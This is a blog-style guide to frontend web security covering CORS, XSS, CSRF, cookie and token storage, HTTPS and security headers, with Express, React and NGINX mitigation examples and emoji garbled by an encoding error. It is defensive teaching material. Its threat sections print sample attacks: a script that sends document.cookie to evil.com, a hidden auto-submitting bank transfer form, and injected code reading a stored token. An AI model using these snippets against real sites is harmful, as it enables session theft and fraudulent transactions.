---
title: Frontend Security
description: Understanding security for frontend engineers.
date: 2024-09-12
thumbnail: '/images/undraw/image-12.png'
tags:
  - javascript
---

## 1. CORS Misconfigurations

### **ğŸ” What it is**

CORS (Cross-Origin Resource Sharing) controlsÂ **which domains are allowed**Â to make requests to your backend from the browser. Without it, your frontend app wouldnâ€™t be able to call your API if itâ€™s hosted on a different domain.

### **ğŸš¨The Threat**

A common mistake is allowing:

```
Access-Control-Allow-Origin: *
```

This meansÂ **any site**Â can send requests to your API â€” and if cookies or tokens are attached, attackers can impersonate users and steal data.

### **ğŸ›¡ï¸ The Solution**

âœ… Whitelist only your trusted frontend domains

âœ… Enable credentialsÂ **only when required**

âœ… Restrict HTTP methods

**Secure Express setup example:**

```javascript
import cors from "cors";

app.use(cors({
  origin: "https://yourapp.com", // âœ… only your frontend
  credentials: true,             // âš ï¸ enable only if you send cookies
  methods: ["GET", "POST"],      // âœ… restrict allowed methods
}));
```

## 2. XSS (Cross-Site Scripting)

### **ğŸ” What it is**

XSS (Cross-Site Scripting) happens when attackers inject malicious JavaScript into your app. This code runs inside the userâ€™s browser and can steal cookies, tokens, or sensitive data.

### **ğŸš¨ The Threat**

If user-generated content is rendered without sanitization, an attacker could inject:

```
<script>
  fetch("https://evil.com/steal?cookie=" + document.cookie)
</script>
```

This script would execute in the victimâ€™s browser and send their session cookie to the attackerâ€™s server.

### **ğŸ›¡ï¸ The Solution**

âœ… Always sanitize and escape user input

âœ… AvoidÂ `dangerouslySetInnerHTML`Â in React

âœ… Set aÂ **Content Security Policy (CSP)**Â to block unauthorized scripts

**Secure Rendering in React:**

```
import DOMPurify from "dompurify";
```

```
// âœ… Sanitize user input before rendering
<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(userInput) }} />
```

**CSP Header Example:**

```
Content-Security-Policy: default-src 'self'; script-src 'self'
```

## 3. CSRF (Cross-Site Request Forgery)

### **ğŸ” What it is**

CSRF (Cross-Site Request Forgery) tricks an authenticated userâ€™s browser into sending unintended requests to your backend. Since the browser automatically includes cookies with requests, attackers can exploit this to perform actions without the userâ€™s knowledge.

### **ğŸš¨ The Threat**

Imagine youâ€™re logged into a banking app. You visit a malicious site that silently submits a hidden form:

```
<form action="https://bank.com/transfer" method="POST">
  <input type="hidden" name="amount" value="5000" />
</form>
<script>document.forms[0].submit()</script>
```

Your browser includes your valid session cookies, and the bank processes it as if you initiated the transfer.

### **ğŸ›¡ï¸ The Solution**

âœ… UseÂ **SameSite cookies**Â to restrict cross-site requests

âœ… Generate and validateÂ **CSRF tokens**Â for sensitive actions

âœ… Verify theÂ **Origin**Â orÂ **Referer**Â header on the backend

**Secure Cookie Setup:**

```
Set-Cookie: sessionId=abc123; HttpOnly; Secure; SameSite=Strict
```

**CSRF Token Example (Frontend with Axios):**

```
const csrfToken = document.querySelector('meta[name="csrf-token"]').content;

await axios.post("/update-profile", data, {
  headers: { "X-CSRF-Token": csrfToken },
  withCredentials: true,
});
```

**CSRF Middleware (Express) example:**

```
import csrf from "csurf";
app.use(csrf({ cookie: true }));

app.post("/update-profile", (req, res) => {
  res.send("Profile updated securely âœ…");
});
```

## 4. Insecure Cookies & Token Storage**

### **ğŸ” What it is**

Cookies and tokens (like JWTs) are used to store user authentication and session data. If stored or configured incorrectly, they can be stolen through attacks like XSS or intercepted over insecure connections.

### **ğŸš¨ The Threat**

A common mistake is storing JWTs inÂ `localStorage`Â orÂ `sessionStorage`. If an attacker injects malicious JavaScript, they can easily grab the token:

```
// XSS injected code
console.log(localStorage.getItem("authToken"));
```

With that token, the attacker can impersonate the user and access protected APIs.

### **ğŸ›¡ï¸ The Solution**

âœ… Store sensitive tokens inÂ **HttpOnly cookies**Â (not accessible via JavaScript)

âœ… Always use theÂ `Secure`Â flag so cookies are sent only over HTTPS

âœ… AddÂ `SameSite=Strict`Â to block cross-site misuse

âœ… Keep expiry times short and rotate tokens regularly

**Secure Cookie Example:**

```
Set-Cookie: authToken=xyz123; HttpOnly; Secure; SameSite=Strict; Max-Age=3600
```

**Frontend API Call Using HttpOnly Cookies example:**

```
const response = await fetch("/api/profile", {
  method: "GET",
  credentials: "include", // âœ… sends HttpOnly cookie automatically
});
```

**Backend Example (Express) exmaple:**

```
res.cookie("authToken", token, {
  httpOnly: true,
  secure: true,
  sameSite: "strict",
  maxAge: 3600000, // 1 hour
});
```

## 5. HTTPS Everywhere**

### **ğŸ” What it is**

HTTPS (Hypertext Transfer Protocol Secure) encrypts communication between the browser and the server. It ensures that sensitive data like cookies, tokens, or personal information cannot be read or modified by attackers while in transit.

### **ğŸš¨ The Threat**

If your app uses plain HTTP, attackers on the same network (like public Wi-Fi) can:

- **Eavesdrop**Â on API calls and steal tokens/cookies
- **Inject malicious responses**Â (man-in-the-middle attacks)
- **Redirect traffic**Â to phishing or fake servers

For example, an HTTP request might expose your token in plain text:

```
GET /api/profile HTTP/1.1
Host: myapp.com
Authorization: Bearer xyz123
```

Anyone intercepting traffic sees everything.

### **ğŸ›¡ï¸ The Solution**

âœ… Always use HTTPS (get a free SSL cert via Letâ€™s Encrypt)

âœ… Redirect all HTTP traffic to HTTPS

âœ… UseÂ **HSTS (HTTP Strict Transport Security)**Â to enforce HTTPS

**Express Redirect Example:**

```
app.use((req, res, next) => {
  if (req.protocol === "http") {
    res.redirect(301, `https://${req.headers.host}${req.url}`);
  } else {
    next();
  }
});
```

**HSTS Header Example:**

```
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
```

**NGINX Config Example:**

```
server {
    listen 80;
    server_name myapp.com;
    return 301 https://$host$request_uri;
}
```

Its okay to use http in local but deployed environments should always have https enabled

## 6. Security Headers That Save You**

### **ğŸ” What it is**

Security headers are special HTTP response headers that tell the browser how to handle content. They act asÂ **built-in guards**Â against common web attacks like clickjacking, MIME sniffing, or unauthorized script execution.

### **ğŸš¨ The Threat**

Without proper headers:

- Your app could be embedded in anÂ `<iframe>`Â â†’ enablingÂ **clickjacking**Â attacks.
- Browsers might try to â€œguessâ€ file types â†’ leading toÂ **MIME sniffing**Â exploits.
- Third-party scripts could load freely â†’ increasingÂ **XSS risks**.
- Sensitive referrer info could leak across sites.

### **ğŸ›¡ï¸ The Solution**

âœ… Set security headers at the server or CDN level

âœ… Combine them with HTTPS and cookies for stronger protection

**Example Header Config (Express + Helmet):**

```
import helmet from "helmet";
app.use(helmet());
```

This automatically applies safe defaults. You can customize further:

```
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
X-Frame-Options: DENY
X-Content-Type-Options: nosniff
Referrer-Policy: strict-origin-when-cross-origin
Content-Security-Policy: default-src 'self'
Permissions-Policy: geolocation=(), microphone=()
```

**NGINX Config Example:**

```bash
add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload";
add_header X-Frame-Options "DENY";
add_header X-Content-Type-Options "nosniff";
add_header Referrer-Policy "strict-origin-when-cross-origin";
add_header Content-Security-Policy "default-src 'self'";
add_header Permissions-Policy "geolocation=(), microphone=()";
```

# **âœ… The Frontend Security Checklist**

You can have a go-to checklist like this that helps you keep yrack whether the best practices are being followed while you code

- UseÂ **HTTPS everywhere**Â (enforce + HSTS)
- ConfigureÂ **CORS**Â properly â†’ whitelist origins, restrict methods, allow credentials only if needed
- Protect againstÂ **XSS**Â â†’ sanitize inputs, avoid unsafe rendering, use CSP
- PreventÂ **CSRF**Â â†’Â `SameSite=Strict`Â cookies, CSRF tokens, validateÂ `Origin/Referer`
- SecureÂ **Cookies & Tokens**Â â†’ HttpOnly, Secure, SameSite, short expiry, rotate tokens
- SetÂ **Important**Â **Security Headers**Â â†’

```bash
`Strict-Transport-Security`
`X-Frame-Options: DENY`
`X-Content-Type-Options: nosniff`
`Referrer-Policy: strict-origin-when-cross-origin`
`Permissions-Policy`
```
